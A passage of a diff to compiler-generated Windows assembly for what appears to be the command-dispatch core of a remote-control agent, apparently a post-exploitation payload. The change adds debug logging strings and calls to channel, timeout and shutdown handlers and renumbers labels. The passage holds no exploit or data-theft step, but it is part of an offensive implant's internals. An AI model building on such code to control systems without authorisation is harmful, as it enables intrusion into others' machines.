+	call	_real_dprintf
+	jmp	L103
+L102:
 	movl	$0, -12(%ebp)
-	jmp	L101
-L108:
-	nop
-L101:
+L103:
 	movl	-72(%ebp), %eax
 	testl	%eax, %eax
-	je	L102
+	je	L104
 	movl	-72(%ebp), %eax
 	movl	%eax, (%esp)
 	call	_free
 	movl	$0, -72(%ebp)
-L102:
+L104:
 	cmpl	$0, -12(%ebp)
-	je	L103
+	je	L105
 	cmpl	$0, -24(%ebp)
-	je	L103
+	je	L105
+	movl	$LC49, (%esp)
+	call	_real_dprintf
 	movl	-24(%ebp), %eax
 	movl	%eax, 8(%esp)
 	movl	8(%ebp), %eax
@@ -1331,35 +1744,61 @@ L102:
 	movl	-12(%ebp), %eax
 	movl	%eax, (%esp)
 	call	_packet_transmit_response
-L103:
+L105:
 	cmpl	$0, -16(%ebp)
-	je	L104
+	je	L106
+	movl	-16(%ebp), %eax
+	movl	%eax, 4(%esp)
+	movl	$LC50, (%esp)
+	call	_real_dprintf
 	movl	-16(%ebp), %eax
 	movl	%eax, (%esp)
 	movl	__imp__CloseHandle@4, %eax
 	call	*%eax
 	subl	$4, %esp
-L104:
+L106:
 	cmpl	$0, -20(%ebp)
-	je	L105
+	je	L107
+	movl	-20(%ebp), %eax
+	movl	%eax, 4(%esp)
+	movl	$LC51, (%esp)
+	call	_real_dprintf
 	movl	-20(%ebp), %eax
 	movl	%eax, (%esp)
 	movl	__imp__CloseHandle@4, %eax
 	call	*%eax
 	subl	$4, %esp
-L105:
+L107:
 	cmpl	$0, 16(%ebp)
-	je	L106
+	je	L108
 	movl	16(%ebp), %eax
 	movl	-12(%ebp), %edx
 	movl	%edx, (%eax)
-L106:
+L108:
+	movl	-12(%ebp), %eax
+	movl	%eax, 4(%esp)
+	movl	$LC52, (%esp)
+	call	_real_dprintf
 	cmpl	$0, -12(%ebp)
 	setne	%al
 	movzbl	%al, %eax
 	movl	-4(%ebp), %ebx
 	leave
 	ret
+	.section .rdata,"dr"
+	.align 4
+LC53:
+	.ascii "[DISPATCH TIMEOUT] setting expiration time to %d\0"
+	.align 4
+LC54:
+	.ascii "[DISPATCH TIMEOUT] setting comms timeout to %d\0"
+	.align 4
+LC55:
+	.ascii "[DISPATCH TIMEOUT] setting retry total to %u\0"
+	.align 4
+LC56:
+	.ascii "[DISPATCH TIMEOUT] setting retry wait to %u\0"
+	.text
 	.globl	_remote_request_core_transport_set_timeouts
 	.def	_remote_request_core_transport_set_timeouts;	.scl	2;	.type	32;	.endef
 _remote_request_core_transport_set_timeouts:
@@ -1374,10 +1813,10 @@ _remote_request_core_transport_set_timeouts:
 	call	_packet_create_response
 	movl	%eax, -16(%ebp)
 	cmpl	$0, -16(%ebp)
-	jne	L110
+	jne	L111
 	movl	$8, -12(%ebp)
-	jmp	L111
-L110:
+	jmp	L112
+L111:
 	movl	$131506, 4(%esp)
 	movl	12(%ebp), %eax
 	movl	%eax, (%esp)
@@ -1399,7 +1838,11 @@ L110:
 	call	_packet_get_tlv_value_uint
 	movl	%eax, -32(%ebp)
 	cmpl	$0, -20(%ebp)
-	je	L112
+	je	L113
+	movl	-20(%ebp), %eax
+	movl	%eax, 4(%esp)
+	movl	$LC53, (%esp)
+	call	_real_dprintf
 	movl	8(%ebp), %eax
 	movl	-20(%ebp), %edx
 	movl	%edx, 68(%eax)
@@ -1408,9 +1851,13 @@ L110:
 	addl	%eax, %edx
 	movl	8(%ebp), %eax
 	movl	%edx, 72(%eax)
-L112:
+L113:
 	cmpl	$0, -24(%ebp)
-	je	L113
+	je	L114
+	movl	-24(%ebp), %eax
+	movl	%eax, 4(%esp)
+	movl	$LC54, (%esp)
+	call	_real_dprintf
 	movl	8(%ebp), %eax
 	movl	4(%eax), %eax
 	movl	-24(%ebp), %edx
@@ -1419,21 +1866,29 @@ L112:
 	movl	4(%eax), %ebx
 	call	_current_unix_timestamp
 	movl	%eax, 64(%ebx)
-L113:
+L114:
 	cmpl	$0, -28(%ebp)
-	je	L114
+	je	L115
+	movl	-28(%ebp), %eax
+	movl	%eax, 4(%esp)
+	movl	$LC55, (%esp)
+	call	_real_dprintf
 	movl	8(%ebp), %eax
 	movl	4(%eax), %eax
 	movl	-28(%ebp), %edx
 	movl	%edx, 56(%eax)
-L114:
+L115:
 	cmpl	$0, -32(%ebp)
-	je	L115
+	je	L116
+	movl	-32(%ebp), %eax
+	movl	%eax, 4(%esp)
+	movl	$LC56, (%esp)
+	call	_real_dprintf
 	movl	8(%ebp), %eax
 	movl	4(%eax), %eax
 	movl	-32(%ebp), %edx
 	movl	%edx, 60(%eax)
-L115:
+L116:
 	movl	8(%ebp), %eax
 	movl	72(%eax), %ebx
 	call	_current_unix_timestamp
@@ -1468,9 +1923,9 @@ L115:
 	movl	-16(%ebp), %eax
 	movl	%eax, (%esp)
 	call	_packet_add_tlv_uint
-L111:
+L112:
 	cmpl	$0, -16(%ebp)
-	je	L116
+	je	L117
 	movl	-16(%ebp), %eax
 	movl	%eax, 8(%esp)
 	movl	8(%ebp), %eax
@@ -1478,12 +1933,29 @@ L111:
 	movl	-12(%ebp), %eax
 	movl	%eax, (%esp)
 	call	_packet_transmit_response
-L116:
+L117:
 	movl	-12(%ebp), %eax
 	addl	$52, %esp
 	popl	%ebx
 	popl	%ebp
 	ret
+	.section .rdata,"dr"
+	.align 4
+LC57:
+	.ascii "[CHANNEL] Opening new channel for packet %p\0"
+LC58:
+	.ascii "[CHANNEL] Opening %s %u\0"
+LC59:
+	.ascii "[CHANNEL] Opened %s %u\0"
+	.align 4
+LC60:
+	.ascii "[CHANNEL] Channel class for %s: %u\0"
+	.align 4
+LC61:
+	.ascii "[CHANNEL] Sending response for %s\0"
+LC62:
+	.ascii "[CHANNEL] Done\0"
+	.text
 	.globl	_remote_request_core_channel_open
 	.def	_remote_request_core_channel_open;	.scl	2;	.type	32;	.endef
 _remote_request_core_channel_open:
@@ -1492,44 +1964,67 @@ _remote_request_core_channel_open:
 	subl	$56, %esp
 	movl	$0, -12(%ebp)
 	movl	$0, -16(%ebp)
+	movl	12(%ebp), %eax
+	movl	%eax, 4(%esp)
+	movl	$LC57, (%esp)
+	call	_real_dprintf
 	movl	$65587, 4(%esp)
 	movl	12(%ebp), %eax
 	movl	%eax, (%esp)
 	call	_packet_get_tlv_value_string
 	movl	%eax, -20(%ebp)
 	cmpl	$0, -20(%ebp)
-	je	L119
+	je	L120
 	movl	$1168, -12(%ebp)
-	jmp	L120
-L119:
+	jmp	L121
+L120:
 	movl	$131099, 4(%esp)
 	movl	12(%ebp), %eax
 	movl	%eax, (%esp)
 	call	_packet_get_tlv_value_uint
 	movl	%eax, -16(%ebp)
+	movl	-16(%ebp), %eax
+	movl	%eax, 8(%esp)
+	movl	-20(%ebp), %eax
+	movl	%eax, 4(%esp)
+	movl	$LC58, (%esp)
+	call	_real_dprintf
 	movl	12(%ebp), %eax
 	movl	%eax, (%esp)
 	call	_packet_create_response
 	movl	%eax, -24(%ebp)
 	cmpl	$0, -24(%ebp)
-	je	L121
+	je	L122
 	movl	-16(%ebp), %eax
 	movl	%eax, 4(%esp)
 	movl	$0, (%esp)
 	call	_channel_create
 	movl	%eax, -28(%ebp)
 	cmpl	$0, -28(%ebp)
-	jne	L122
-L121:
-	movl	$8, -12(%ebp)
-	jmp	L120
+	jne	L123
 L122:
+	movl	$8, -12(%ebp)
+	jmp	L121
+L123:
+	movl	-16(%ebp), %eax
+	movl	%eax, 8(%esp)
+	movl	-20(%ebp), %eax
+	movl	%eax, 4(%esp)
+	movl	$LC59, (%esp)
+	call	_real_dprintf
 	movl	$131126, 4(%esp)
 	movl	12(%ebp), %eax
 	movl	%eax, (%esp)
 	call	_packet_get_tlv_value_uint
 	movl	-28(%ebp), %edx
 	movl	%eax, 4(%edx)
+	movl	-28(%ebp), %eax
+	movl	4(%eax), %eax
+	movl	%eax, 8(%esp)
+	movl	-20(%ebp), %eax
+	movl	%eax, 4(%esp)
+	movl	$LC60, (%esp)
+	call	_real_dprintf
 	movl	-28(%ebp), %eax
 	movl	%eax, (%esp)
 	call	_channel_get_id
@@ -1540,7 +2035,11 @@ L122:
 	call	_packet_add_tlv_uint
 	movl	%eax, -12(%ebp)
 	cmpl	$0, -12(%ebp)
-	jne	L125
+	jne	L126
+	movl	-20(%ebp), %eax
+	movl	%eax, 4(%esp)
+	movl	$LC61, (%esp)
+	call	_real_dprintf
 	movl	$0, 8(%esp)
 	movl	-24(%ebp), %eax
 	movl	%eax, 4(%esp)
@@ -1548,10 +2047,12 @@ L122:
 	movl	%eax, (%esp)
 	call	_packet_transmit
 	movl	%eax, -12(%ebp)
-	jmp	L120
-L125:
+	movl	$LC62, (%esp)
+	call	_real_dprintf
+	jmp	L121
+L126:
 	nop
-L120:
+L121:
 	movl	-12(%ebp), %eax
 	leave
 	ret
@@ -1568,20 +2069,20 @@ _remote_response_core_channel_open:
 	call	_packet_get_tlv_value_uint
 	movl	%eax, -16(%ebp)
 	cmpl	$0, -16(%ebp)
-	jne	L127
+	jne	L128
 	movl	$8, -12(%ebp)
-	jmp	L128
-L127:
+	jmp	L129
+L128:
 	movl	$0, 4(%esp)
 	movl	-16(%ebp), %eax
 	movl	%eax, (%esp)
 	call	_channel_create
 	movl	%eax, -20(%ebp)
 	cmpl	$0, -20(%ebp)
-	jne	L128
+	jne	L129
 	movl	$8, -12(%ebp)
 	nop
-L128:
+L129:
 	movl	-12(%ebp), %eax
 	leave
 	ret
@@ -1610,10 +2111,10 @@ _remote_request_core_channel_write:
 	call	_channel_find_by_id
 	movl	%eax, -20(%ebp)
 	cmpl	$0, -20(%ebp)
-	jne	L131
+	jne	L132
 	movl	$1168, -12(%ebp)
-	jmp	L132
-L131:
+	jmp	L133
+L132:
 	movl	-20(%ebp), %eax
 	movl	20(%eax), %eax
 	movl	%eax, (%esp)
@@ -1626,12 +2127,12 @@ L131:
 	call	_packet_get_tlv
 	movl	%eax, -12(%ebp)
 	cmpl	$0, -12(%ebp)
-	jne	L140
+	jne	L141
 	movl	-20(%ebp), %eax
 	movl	%eax, (%esp)
 	call	_channel_get_class
 	testl	%eax, %eax
-	jne	L134
+	jne	L135
 	movl	-44(%ebp), %edx
 	movl	-36(%ebp), %eax
 	leal	-32(%ebp), %ecx
@@ -1642,15 +2143,15 @@ L131:
 	movl	%eax, (%esp)
 	call	_channel_write_to_buffered
 	movl	%eax, -12(%ebp)
-	jmp	L132
-L134:
+	jmp	L133
+L135:
 	movl	-20(%ebp), %eax
 	addl	$24, %eax
 	movl	%eax, -28(%ebp)
 	movl	-28(%ebp), %eax
 	movl	4(%eax), %eax
 	testl	%eax, %eax
-	je	L135
+	je	L136
 	movl	-28(%ebp), %eax
 	movl	4(%eax), %eax
 	movl	-44(%ebp), %ebx
@@ -1668,22 +2169,22 @@ L134:
 	movl	%edx, (%esp)
 	call	*%eax
 	movl	%eax, -12(%ebp)
-	jmp	L132
-L135:
+	jmp	L133
+L136:
 	movl	$50, -12(%ebp)
-	jmp	L132
-L140:
+	jmp	L133
+L141:
 	nop
-L132:
+L133:
 	cmpl	$0, -20(%ebp)
-	je	L137
+	je	L138
 	movl	-20(%ebp), %eax
 	movl	20(%eax), %eax
 	movl	%eax, (%esp)
 	call	_lock_release
-L137:
+L138:
 	cmpl	$0, -16(%ebp)
-	je	L138
+	je	L139
 	movl	-32(%ebp), %eax
 	movl	%eax, 8(%esp)
 	movl	$131097, 4(%esp)
@@ -1704,7 +2205,7 @@ L137:
 	movl	%eax, (%esp)
 	call	_packet_transmit_response
 	movl	%eax, -12(%ebp)
-L138:
+L139:
 	movl	-12(%ebp), %eax
 	addl	$80, %esp
 	popl	%ebx
@@ -1725,10 +2226,10 @@ _remote_request_core_channel_read:
 	movl	$0, -20(%ebp)
 	movl	$0, -24(%ebp)
 	cmpl	$0, -28(%ebp)
-	jne	L142
+	jne	L143
 	movl	$8, -12(%ebp)
-	jmp	L143
-L142:
+	jmp	L144
+L143:
 	movl	$131097, 4(%esp)
 	movl	12(%ebp), %eax
 	movl	%eax, (%esp)
@@ -1744,10 +2245,10 @@ L142:
 	call	_channel_find_by_id
 	movl	%eax, -24(%ebp)
 	cmpl	$0, -24(%ebp)
-	jne	L144
+	jne	L145
 	movl	$1168, -12(%ebp)
-	jmp	L143
-L144:
+	jmp	L144
+L145:
 	movl	-24(%ebp), %eax
 	movl	20(%eax), %eax
 	movl	%eax, (%esp)
@@ -1757,19 +2258,19 @@ L144:
 	call	_malloc
 	movl	%eax, -20(%ebp)
 	cmpl	$0, -20(%ebp)
-	jne	L145
+	jne	L146
 	movl	$8, -12(%ebp)
-	jmp	L143
-L145:
+	jmp	L144
+L146:
 	movl	-24(%ebp), %eax
 	movl	%eax, (%esp)
 	call	_channel_get_class
 	testl	%eax, %eax
-	je	L146
-	cmpl	$3, %eax
 	je	L147
-	jmp	L159
-L146:
+	cmpl	$3, %eax
+	je	L148
+	jmp	L160
+L147:
 	leal	-36(%ebp), %eax
 	movl	%eax, 12(%esp)
 	movl	-32(%ebp), %eax
@@ -1780,12 +2281,12 @@ L146:
 	movl	%eax, (%esp)
 	call	_channel_read_from_buffered
 	movl	%eax, -12(%ebp)
-	jmp	L149
-L147:
+	jmp	L150
+L148:
 	movl	-24(%ebp), %eax
 	movl	40(%eax), %eax
 	testl	%eax, %eax
-	je	L150
+	je	L151
 	movl	-24(%ebp), %eax
 	movl	40(%eax), %eax
 	movl	-24(%ebp), %edx
@@ -1803,32 +2304,32 @@ L147:
 	movl	%edx, (%esp)
 	call	*%eax
 	movl	%eax, -12(%ebp)
-	jmp	L149
+	jmp	L150
+L151:
+	movl	$50, -12(%ebp)
+	jmp	L150
+L160:
+	movl	$50, -12(%ebp)
 L150:
-	movl	$50, -12(%ebp)
-	jmp	L149
-L159:
-	movl	$50, -12(%ebp)
-L149:
 	cmpl	$0, -12(%ebp)
-	jne	L143
+	jne	L144
 	cmpl	$0, -20(%ebp)
-	je	L143
+	je	L144
 	movl	-36(%ebp), %eax
 	testl	%eax, %eax
-	je	L143
+	je	L144
 	movl	$1, 4(%esp)
 	movl	-24(%ebp), %eax
 	movl	%eax, (%esp)
 	call	_channel_is_flag
 	testb	%al, %al
-	je	L152
+	je	L153
 	movl	$2, 4(%esp)
 	movl	-24(%ebp), %eax
 	movl	%eax, (%esp)
 	call	_channel_is_flag
 	testb	%al, %al
-	je	L153
+	je	L154
 	movl	-36(%ebp), %eax
 	movl	%eax, 12(%esp)
 	movl	-20(%ebp), %eax
@@ -1837,8 +2338,8 @@ L149:
 	movl	-28(%ebp), %eax
 	movl	%eax, (%esp)
 	call	_packet_add_tlv_raw
-	jmp	L154
-L153:
+	jmp	L155
+L154:
 	movl	-36(%ebp), %eax
 	movl	%eax, 12(%esp)
 	movl	-20(%ebp), %eax
@@ -1847,10 +2348,10 @@ L153:
 	movl	-28(%ebp), %eax
 	movl	%eax, (%esp)
 	call	_packet_add_tlv_raw
-L154:
+L155:
 	movl	$0, -12(%ebp)
-	jmp	L143
-L152:
+	jmp	L144
+L153:
 	movl	-36(%ebp), %eax
 	movl	$0, 24(%esp)
 	movl	%eax, 20(%esp)
@@ -1865,22 +2366,22 @@ L152:
 	call	_channel_write
 	movl	%eax, -12(%ebp)
 	cmpl	$0, -12(%ebp)
-L143:
+L144:
 	cmpl	$0, -24(%ebp)
-	je	L155
+	je	L156
 	movl	-24(%ebp), %eax
 	movl	20(%eax), %eax
 	movl	%eax, (%esp)
 	call	_lock_release
-L155:
+L156:
 	cmpl	$0, -20(%ebp)
-	je	L156
+	je	L157
 	movl	-20(%ebp), %eax
 	movl	%eax, (%esp)
 	call	_free
-L156:
+L157:
 	cmpl	$0, -28(%ebp)
-	je	L157
+	je	L158
 	movl	-36(%ebp), %eax
 	movl	%eax, 8(%esp)
 	movl	$131097, 4(%esp)
@@ -1901,10 +2402,21 @@ L156:
 	movl	%eax, (%esp)
 	call	_packet_transmit_response
 	movl	%eax, -12(%ebp)
-L157:
+L158:
 	movl	-12(%ebp), %eax
 	leave
 	ret
+	.section .rdata,"dr"
+	.align 4
+LC63:
+	.ascii "[CHANNEL] remote_request_core_channel_close.\0"
+	.align 4
+LC64:
+	.ascii "[CHANNEL] unable to find channel of id %d\0"
+	.align 4
+LC65:
+	.ascii "[CHANNEL] closing channel of id %d\0"
+	.text
 	.globl	_remote_request_core_channel_close
 	.def	_remote_request_core_channel_close;	.scl	2;	.type	32;	.endef
 _remote_request_core_channel_close:
@@ -1917,6 +2429,8 @@ _remote_request_core_channel_close:
 	movl	%eax, -16(%ebp)
 	movl	$0, -12(%ebp)
 	movl	$0, -20(%ebp)
+	movl	$LC63, (%esp)
+	call	_real_dprintf
 	movl	$131122, 4(%esp)
 	movl	12(%ebp), %eax
 	movl	%eax, (%esp)
@@ -1927,26 +2441,34 @@ _remote_request_core_channel_close:
 	call	_channel_find_by_id
 	movl	%eax, -20(%ebp)
 	cmpl	$0, -20(%ebp)
-	jne	L161
+	jne	L162
 	movl	$1168, -12(%ebp)
-	jmp	L162
-L161:
+	movl	-24(%ebp), %eax
+	movl	%eax, 4(%esp)
+	movl	$LC64, (%esp)
+	call	_real_dprintf
+	jmp	L163
+L162:
+	movl	-24(%ebp), %eax
+	movl	%eax, 4(%esp)
+	movl	$LC65, (%esp)
+	call	_real_dprintf
 	movl	12(%ebp), %eax
 	movl	%eax, 4(%esp)
 	movl	-20(%ebp), %eax
 	movl	%eax, (%esp)
 	call	_channel_destroy
 	cmpl	$0, -16(%ebp)
-	je	L162
+	je	L163
 	movl	-24(%ebp), %eax
 	movl	%eax, 8(%esp)
 	movl	$131122, 4(%esp)
 	movl	-16(%ebp), %eax
 	movl	%eax, (%esp)
 	call	_packet_add_tlv_uint
-L162:
+L163:
 	cmpl	$0, -16(%ebp)
-	je	L163
+	je	L164
 	movl	-16(%ebp), %eax
 	movl	%eax, 8(%esp)
 	movl	8(%ebp), %eax
@@ -1955,7 +2477,7 @@ L162:
 	movl	%eax, (%esp)
 	call	_packet_transmit_response
 	movl	%eax, -12(%ebp)
-L163:
+L164:
 	movl	-12(%ebp), %eax
 	leave
 	ret
@@ -1977,16 +2499,16 @@ _remote_response_core_channel_close:
 	call	_channel_find_by_id
 	movl	%eax, -16(%ebp)
 	cmpl	$0, -16(%ebp)
-	jne	L166
+	jne	L167
 	movl	$1168, -12(%ebp)
-	jmp	L167
-L166:
+	jmp	L168
+L167:
 	movl	12(%ebp), %eax
 	movl	%eax, 4(%esp)
 	movl	-16(%ebp), %eax
 	movl	%eax, (%esp)
 	call	_channel_destroy
-L167:
+L168:
 	movl	-12(%ebp), %eax
 	leave
 	ret
@@ -2012,10 +2534,10 @@ _remote_request_core_channel_seek:
 	call	_channel_find_by_id
 	movl	%eax, -16(%ebp)
 	cmpl	$0, -16(%ebp)
-	jne	L170
+	jne	L171
 	movl	$1168, -12(%ebp)
-	jmp	L171
-L170:
+	jmp	L172
+L171:
 	movl	-16(%ebp), %eax
 	movl	20(%eax), %eax
 	movl	%eax, (%esp)
@@ -2024,14 +2546,14 @@ L170:
 	movl	%eax, (%esp)
 	call	_channel_get_class
 	cmpl	$3, %eax
-	je	L172
+	je	L173
 	movl	$50, -12(%ebp)
-	jmp	L171
-L172:
+	jmp	L172
+L173:
 	movl	-16(%ebp), %eax
 	movl	48(%eax), %eax
 	testl	%eax, %eax
-	je	L173
+	je	L174
 	movl	-16(%ebp), %eax
 	movl	48(%eax), %esi
 	movl	$131142, 4(%esp)
@@ -2055,17 +2577,17 @@ L172:
 	movl	%eax, (%esp)
 	call	*%esi
 	movl	%eax, -12(%ebp)
-	jmp	L171
-L173:
+	jmp	L172
+L174:
 	movl	$50, -12(%ebp)
-L171:
+L172:
 	cmpl	$0, -16(%ebp)
-	je	L174
+	je	L175
 	movl	-16(%ebp), %eax
 	movl	20(%eax), %eax
 	movl	%eax, (%esp)
 	call	_lock_release
-L174:
+L175:
 	movl	-20(%ebp), %eax
 	movl	%eax, 8(%esp)
 	movl	8(%ebp), %eax
@@ -2100,10 +2622,10 @@ _remote_request_core_channel_eof:
 	call	_channel_find_by_id
 	movl	%eax, -16(%ebp)
 	cmpl	$0, -16(%ebp)
-	jne	L177
+	jne	L178
 	movl	$1168, -12(%ebp)
-	jmp	L178
-L177:
+	jmp	L179
+L178:
 	movl	-16(%ebp), %eax
 	movl	20(%eax), %eax
 	movl	%eax, (%esp)
@@ -2112,14 +2634,14 @@ L177:
 	movl	%eax, (%esp)
 	call	_channel_get_class
 	cmpl	$3, %eax
-	je	L179
+	je	L180
 	movl	$50, -12(%ebp)
-	jmp	L178
-L179:
+	jmp	L179
+L180:
 	movl	-16(%ebp), %eax
 	movl	44(%eax), %eax
 	testl	%eax, %eax
-	je	L180
+	je	L181
 	movl	-16(%ebp), %eax
 	movl	44(%eax), %eax
 	movl	-16(%ebp), %edx
@@ -2133,17 +2655,17 @@ L179:
 	movl	%edx, (%esp)
 	call	*%eax
 	movl	%eax, -12(%ebp)
-	jmp	L178
-L180:
+	jmp	L179
+L181:
 	movl	$50, -12(%ebp)
-L178:
+L179:
 	cmpl	$0, -16(%ebp)
-	je	L181
+	je	L182
 	movl	-16(%ebp), %eax
 	movl	20(%eax), %eax
 	movl	%eax, (%esp)
 	call	_lock_release
-L181:
+L182:
 	movl	-24(%ebp), %eax
 	movl	%eax, 8(%esp)
 	movl	$524300, 4(%esp)
@@ -2181,10 +2703,10 @@ _remote_request_core_channel_tell:
 	call	_channel_find_by_id
 	movl	%eax, -16(%ebp)
 	cmpl	$0, -16(%ebp)
-	jne	L184
+	jne	L185
 	movl	$1168, -12(%ebp)
-	jmp	L185
-L184:
+	jmp	L186
+L185:
 	movl	-16(%ebp), %eax
 	movl	20(%eax), %eax
 	movl	%eax, (%esp)
@@ -2193,14 +2715,14 @@ L184:
 	movl	%eax, (%esp)
 	call	_channel_get_class
 	cmpl	$3, %eax
-	je	L186
+	je	L187
 	movl	$50, -12(%ebp)
-	jmp	L185
-L186:
+	jmp	L186
+L187:
 	movl	-16(%ebp), %eax
 	movl	52(%eax), %eax
 	testl	%eax, %eax
-	je	L187
+	je	L188
 	movl	-16(%ebp), %eax
 	movl	52(%eax), %eax
 	movl	-16(%ebp), %edx
@@ -2214,17 +2736,17 @@ L186:
 	movl	%edx, (%esp)
 	call	*%eax
 	movl	%eax, -12(%ebp)
-	jmp	L185
-L187:
+	jmp	L186
+L188:
 	movl	$50, -12(%ebp)
-L185:
+L186:
 	cmpl	$0, -16(%ebp)
-	je	L188
+	je	L189
 	movl	-16(%ebp), %eax
 	movl	20(%eax), %eax
 	movl	%eax, (%esp)
 	call	_lock_release
-L188:
+L189:
 	movl	-24(%ebp), %eax
 	movl	%eax, 8(%esp)
 	movl	$131144, 4(%esp)
@@ -2241,6 +2763,11 @@ L188:
 	movl	-12(%ebp), %eax
 	leave
 	ret
+	.section .rdata,"dr"
+	.align 4
+LC66:
+	.ascii "[DISPATCH] attempting to set interactive: %d context 0x%p\0"
+	.text
 	.globl	_remote_request_core_channel_interact
 	.def	_remote_request_core_channel_interact;	.scl	2;	.type	32;	.endef
 _remote_request_core_channel_interact:
@@ -2268,25 +2795,32 @@ _remote_request_core_channel_interact:
 	call	_channel_find_by_id
 	movl	%eax, -20(%ebp)
 	cmpl	$0, -20(%ebp)
-	je	L191
+	je	L192
 	movl	-20(%ebp), %eax
 	movl	20(%eax), %eax
 	movl	%eax, (%esp)
 	call	_lock_acquire
 	cmpl	$0, -16(%ebp)
-	je	L192
+	je	L193
 	movl	-20(%ebp), %eax
 	movl	%eax, (%esp)
 	call	_channel_get_class
 	testl	%eax, %eax
-	je	L192
+	je	L193
 	movl	-20(%ebp), %eax
 	addl	$24, %eax
 	movl	%eax, -32(%ebp)
 	movl	-32(%ebp), %eax
+	movl	(%eax), %edx
+	movzbl	-25(%ebp), %eax
+	movl	%edx, 8(%esp)
+	movl	%eax, 4(%esp)
+	movl	$LC66, (%esp)
+	call	_real_dprintf
+	movl	-32(%ebp), %eax
 	movl	12(%eax), %eax
 	testl	%eax, %eax
-	je	L192
+	je	L193
 	movl	-32(%ebp), %eax
 	movl	12(%eax), %eax
 	movzbl	-25(%ebp), %ecx
@@ -2300,7 +2834,7 @@ _remote_request_core_channel_interact:
 	movl	%edx, (%esp)
 	call	*%eax
 	movl	%eax, -12(%ebp)
-L192:
+L193:
 	movzbl	-25(%ebp), %eax
 	movl	%eax, 4(%esp)
 	movl	-20(%ebp), %eax
@@ -2310,7 +2844,7 @@ L192:
 	movl	20(%eax), %eax
 	movl	%eax, (%esp)
 	call	_lock_release
-L191:
+L192:
 	movl	-16(%ebp), %eax
 	movl	%eax, 8(%esp)
 	movl	8(%ebp), %eax
@@ -2321,6 +2855,14 @@ L191:
 	movl	$0, %eax
 	leave
 	ret
+	.section .rdata,"dr"
+	.align 4
+LC67:
+	.ascii "[DISPATCH] Ack shutdown request\0"
+	.align 4
+LC68:
+	.ascii "[DISPATCH] Telling dispatch loop to finish\0"
+	.text
 	.globl	_remote_request_core_shutdown
 	.def	_remote_request_core_shutdown;	.scl	2;	.type	32;	.endef
 _remote_request_core_shutdown:
@@ -2338,6 +2880,8 @@ _remote_request_core_shutdown:
 	movl	-16(%ebp), %eax
 	movl	%eax, (%esp)
 	call	_packet_add_tlv_bool
+	movl	$LC67, (%esp)
+	call	_real_dprintf
 	movl	-16(%ebp), %eax
 	movl	%eax, 8(%esp)
 	movl	8(%ebp), %eax
@@ -2348,10 +2892,14 @@ _remote_request_core_shutdown:
 	movl	16(%ebp), %eax
 	movl	-20(%ebp), %edx
 	movl	%edx, (%eax)
+	movl	$LC68, (%esp)
+	call	_real_dprintf
 	movl	$0, %eax
 	leave
 	ret
 	.ident	"GCC: (GNU) 9.3-win32 20200320"
+	.def	_strlen;	.scl	2;	.type	32;	.endef
+	.def	_vsnprintf_s;	.scl	2;	.type	32;	.endef
 	.def	_calloc;	.scl	2;	.type	32;	.endef
 	.def	_packet_get_tlv_value_wstring;	.scl	2;	.type	32;	.endef
 	.def	_packet_get_tlv_value_uint;	.scl	2;	.type	32;	.endef
